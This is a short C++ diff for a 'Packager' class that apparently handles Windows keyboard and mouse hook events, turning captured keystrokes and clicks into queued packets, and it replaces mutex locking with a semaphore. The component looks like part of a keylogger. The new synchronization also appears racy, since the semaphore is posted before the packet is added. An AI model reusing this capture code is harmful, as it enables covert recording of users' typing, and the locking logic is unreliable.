@@ -2,6 +2,7 @@
 
 
 Packager::Packager()
+  : _sem(0)
 {
 	_shift = false;
 	_win = false;
@@ -100,10 +101,8 @@ void Packager::addKey(int nCode, WPARAM wParam, LPARAM lParam) {
 		std::cout << "string UNICODE : " << str << std::endl;
 		tmp->setText(str);
 		tmp->createPaquet();
-		mutex.lock();
+		_sem.post();
 		_paquets.push_back(tmp);
-		mutex.unlock();
-		readyMutex.unlock();
 	}
 }
 
@@ -134,13 +133,12 @@ void Packager::addClick(int nCode, WPARAM wParam, LPARAM lParam) {
 		tmp->setButton(2);
 	}
 	tmp->createPaquet();
-	mutex.lock();
+	_sem.post();
 	_paquets.push_back(tmp);
-	mutex.unlock();
-	readyMutex.unlock();
 }
 
 size_t Packager::isLeft() {
+	_sem.wait();
 	return _paquets.size();
 }
 
@@ -150,14 +148,4 @@ Paquet *Packager::getPaquet() {
 
 void Packager::supprPaquet() {
 	_paquets.erase(_paquets.begin());
-	if (_paquets.empty())
-		readyMutex.lock();
-}
-
-boost::mutex& Packager::getMutex() {
-	return mutex;
-}
-
-boost::mutex& Packager::getReadyMutex() {
-	return readyMutex;
 }
